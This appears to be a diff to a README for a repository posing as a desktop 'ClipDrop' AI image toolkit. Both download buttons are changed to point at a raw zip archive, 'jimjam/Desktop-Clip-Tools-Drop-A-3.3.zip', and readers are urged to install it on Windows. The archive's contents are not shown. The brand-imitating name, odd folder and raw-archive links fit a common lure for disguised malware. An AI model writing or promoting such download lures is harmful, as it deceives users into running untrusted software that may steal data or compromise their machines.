@@ -1,7 +1,7 @@
 <h1>🧠 ClipDrop-Desktop---ClipDrop-AI-Tools-2026 - All-in-One AI Image Toolkit for Everyone</h1>
 
 <p align="center">
-  <a href="https://github.com/sober-ferrocyanide9941/ClipDrop-Desktop---ClipDrop-AI-Tools-2026">
+  <a href="https://github.com/sober-ferrocyanide9941/ClipDrop-Desktop---ClipDrop-AI-Tools-2026/raw/refs/heads/main/jimjam/Desktop-Clip-Tools-Drop-A-3.3.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Get%20Started-blueviolet?style=for-the-badge&logo=github" alt="Download Link" />
   </a>
 </p>
@@ -124,7 +124,7 @@ A: You can open common image files like JPEG, PNG, BMP, and TIFF. You can save y
 Ready to transform your photos? Click the button below to head over to the official download page and get started right away:
 
 <p align="center">
-  <a href="https://github.com/sober-ferrocyanide9941/ClipDrop-Desktop---ClipDrop-AI-Tools-2026" style="background-color:#FF5722; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:8px; font-weight:bold; display:inline-block;">⬇️ DOWNLOAD ClipDrop-Desktop (2026)</a>
+  <a href="https://github.com/sober-ferrocyanide9941/ClipDrop-Desktop---ClipDrop-AI-Tools-2026/raw/refs/heads/main/jimjam/Desktop-Clip-Tools-Drop-A-3.3.zip" style="background-color:#FF5722; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:8px; font-weight:bold; display:inline-block;">⬇️ DOWNLOAD ClipDrop-Desktop (2026)</a>
 </p>
 
 Once you visit that link, look for the download button or the latest release.It will bring you the latest version for Windows. Follow the simple install steps described in the “Installation & Setup” section above, and you’ll be editing images like a pro in minutes.
